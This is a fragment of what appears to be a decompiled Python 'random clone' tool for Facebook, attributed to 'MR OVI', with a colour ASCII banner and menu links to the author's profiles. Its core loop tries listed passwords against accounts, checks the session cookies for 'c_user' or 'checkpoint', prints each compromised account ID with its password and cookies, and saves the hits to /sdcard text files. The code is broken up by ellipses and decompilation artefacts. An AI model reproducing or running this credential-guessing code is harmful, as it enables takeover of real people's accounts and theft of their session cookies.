...
def o():
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-open https://github.com/DIGITAL-XD')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100070688245790')
        return None
...
logo = ("""
\033[1;96.
  __  __ _____     _____ _      ____  _   _ ______ _____  
 |  \/  |  __ \   / ____| |    / __ \| \ | |  ____|  __ \ 
 | \  / | |__) | | |    | |   | |  | |  \| | |__  | |__) |
 | |\/| |  _  /  | |    | |   | |  | | . ` |  __| |  _  / 
 | |  | | | \ \  | |____| |___| |__| | |\  | |____| | \ \ 
 |_|  |_|_|  \_\  \_____|______\____/|_| \_|______|_|  \_\
...
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mMR OVI
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mMAHMUD HASAN OVI
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mOVI-909
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mRANDOM CLONE
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m VERSION \033[1;91m : \033[1;91m1.0.9
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32mOVI-XD-OK ] '+cid+ ' | ' +ps+    '  \n\033[1;33mCOOKIES : \033[1;32m'+coki+  ' \033[0;32mUSER-AGENT : \033[0;90m'+pro+'  \033[0;90m')
                cek_apk(session,coki)
                open('/sdcard/OVI-XD-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;34mOVI-505-CP ] '+cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/OVI-505-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[OVI-XD] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
